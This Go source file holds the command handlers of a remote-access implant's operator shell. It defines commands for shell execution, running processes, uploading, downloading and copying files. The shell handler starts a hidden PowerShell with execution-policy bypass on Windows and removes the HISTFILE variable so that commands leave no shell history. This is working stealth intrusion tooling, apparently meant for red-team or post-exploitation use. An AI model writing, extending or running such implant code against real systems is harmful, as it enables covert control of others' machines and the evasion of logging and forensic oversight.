package main

/*
 * command.go
 * Command handlers
 * By J. Stuart McMurray
 * Created 20220327
 * Last Modified 20220510
 */

import (
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strings"
	"text/tabwriter"
)

// CommandHandler is a function which handles a command.
type CommandHandler func(s *Shell, args []string) error

// CommandHandlers holds the handlers for every command.
var CommandHandlers = map[string]struct {
	Handler CommandHandler
	Help    string /* Help text. */
}{
	"h":  {CommandHandlerNoOp, "This help"},
	"?":  {CommandHandlerNoOp, "This help"},
	"#":  {CommandHandlerNoOp, "Log a comment"},
	"q":  {CommandHandlerQuit, "Disconnect from the implant"},
	"cd": {CommandHandlerCD, "Change directory"},
	"u":  {CommandHandlerUpload, "Upload file(s) (iTerm2)"},
	"d":  {CommandHandlerDownload, "Download a file (iTerm2)"},
	"s":  {CommandHandlerShell, "Execute (a command in) a shell"},
	"r":  {CommandHandlerRun, "Run a new process and get its output"},
	"c":  {CommandHandlerCopy, "Copy a file to the pasteboard (iTerm2)"},
	"f":  {CommandHandlerFile, "Read/write a file"},
}

func init() {
	/* Avoid initialization loop. */
	for _, c := range []string{"h", "?"} {
		h := CommandHandlers[c]
		h.Handler = CommandHandlerHelp
		CommandHandlers[c] = h
	}
}

// CommandHandlerNoOp is a no-op, for # in CommandHandlers
func CommandHandlerNoOp(*Shell, []string) error { return nil }

// CommandHandlerHelp prints the list of commands.
func CommandHandlerHelp(s *Shell, args []string) error {
	/* Sorted list of commands. */
	cs := make([]string, 0, len(CommandHandlers))
	for c := range CommandHandlers {
		cs = append(cs, c)
	}
	sort.Strings(cs)

	/* Print a nice table. */
	tw := tabwriter.NewWriter(s, 2, 8, 2, ' ', 0)
	fmt.Fprintf(tw, "Command\tDescription\n")
	fmt.Fprintf(tw, "-------\t-----------\n")
	for _, c := range cs {
		fmt.Fprintf(tw, "%s\t%s\n", c, CommandHandlers[c].Help)
	}
	return tw.Flush()
}

// CommandHandlerQuit quits the shell
func CommandHandlerQuit(s *Shell, args []string) error {
	s.Printf("Bye.\n")
	return ErrQuitShell
}

// CommandHandlerCD changes directories.
func CommandHandlerCD(s *Shell, args []string) error {
	/* Need a directory to which to change. */
	if 1 != len(args) {
		s.Printf("Need a directory\n")
		return nil
	}

	s.ChDir(args[0])
	Logf("[%s] Changed directory to %s", s.Tag, args[0])

	return nil
}

// CommandHandlerShell either sends its args to the shell or, if args is empty,
// connects the user to a shell.
func CommandHandlerShell(s *Shell, args []string) error {
	/* Get a platform-appropriate shell. */
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command(
			"powershell.exe",
			"-nop",
			"-windowstyle", "hidden",
			"-noni",
			"-ep", "bypass",
			"-command", "-",
		)
	default:
		cmd = exec.Command("/bin/sh")
	}
	cmd.Dir = s.Getwd()
	cmd.Stdout = s
	cmd.Stderr = s

	/* Remove the HISTFILE environment variable. */
	env := os.Environ()
	last := 0
	for _, v := range env {
		if strings.HasPrefix(v, "HISTFILE=") {
			continue
		}
		env[last] = v
		last++
	}
	env = env[:last]
	cmd.Env = env

	/* If we're running a single command, life's easy. */
	if 0 != len(args) {
		input := strings.Join(args, " ")
		cmd.Stdin = strings.NewReader(input)
		Logf("[%s] Sending %q to %s", s.Tag, input, cmd.Path)
		if err := cmd.Run(); nil != err {
			s.Logf("Unclean exit: %s", err)
		}
		return nil
	}

	/* We'll be taking input from the user.  Pipe to proxy in. */
	sin, err := cmd.StdinPipe()
	if nil != err {
		s.Logf("Error getting stdin for shell: %s", err)
	}

	/* Start the shell going. */
	if err := cmd.Start(); nil != err {
		s.Logf("Error starting interactive shell: %s", err)
		return nil
	}
	s.Logf("Started interactive shell")
	s.Printf("Input is line-oriented, some things may not work.\n")
	s.Term.SetPrompt("shell> ")
	defer s.ChDir("")

	/* Send input lines to shell. */
	go func() {
		defer sin.Close()
		for {
			/* Grab a line to send to the shell. */
			l, err := s.Term.ReadLine()
			if nil != err {
				s.Logf(
					"Error reading input for "+
						"interactive shell: %s",
					err,
				)
				return
			}
			if _, err := fmt.Fprintf(sin, "%s\n", l); nil != err {
				if !errors.Is(err, io.EOF) &&
					!errors.Is(err, fs.ErrClosed) {
					s.Logf(
						"Error sending input to "+
							"interactive shell: "+
							"%s",
						err,
					)
				}
				return
			} else {
				if "" != l {
					Logf("[%s] Shell input: %q", s.Tag, l)
				}
			}
		}
	}()

	if err := cmd.Wait(); nil != err {
		s.Logf("Shell terminated with error: %s", err)
	} else {
		s.Logf("Shell terminated.")
	}
	s.Logf("Hit enter twice to return to the normal prompt.")
	return nil
}

// CommandHandlerRun runs a new process with the given argv.
func CommandHandlerRun(s *Shell, args []string) error {
	/* Make sure we have something to run. */
	if 0 == len(args) {
		s.Printf("Need an argument vector\n")
		return nil
	}
	/* Roll a command to run. */
	cmd := exec.Command(args[0], args[1:]...)
	cmd.Dir = s.Getwd()
	cmd.Stdout = s
	cmd.Stderr = s

	/* Gogogo! */
	s.Logf("Spawning new process with argv %q", args)
	if err := cmd.Run(); nil != err {
		s.Logf("Process terminated with error: %s", err)
		return nil
	}
	Logf("[%s] Process terminated", s.Tag)
	return nil
}

// CommandHandlerCopy uses iTerm2 to copy the contents of a file to the
// pasteboard.  This requires iTerm2.
func CommandHandlerCopy(s *Shell, args []string) error {
	/* Make sure we have exactly one file. */
	if 1 != len(args) {
		s.Printf("Need exactly one file to copy\n")
		return nil
	}
	/* Open the file in question. */
	f, err := os.Open(args[0])
	if nil != err {
		s.Printf("Unable to open %s: %s", args[0], err)
	}
	defer f.Close()

	/* Tell the terminal we're about to send a file. */
	s.Printf("\x1b]1337;Copy=:")

	/* Send the file.  We don't report the error until we tell the terminal
	we're done. */
	enc := base64.NewEncoder(base64.StdEncoding, s)
	n, err := io.Copy(enc, f)
	enc.Close()

	/* Tell the terminal we're done. */
	s.Printf("\x07")

	/* Let the user and server know what happened. */
	if nil != err {
		s.Logf(
			"Error after copying %d bytes of %s: %s",
			n,
			f.Name(),
			err,
		)
		return nil
	}
	s.Logf("Copied %s", f.Name())
	return nil
}
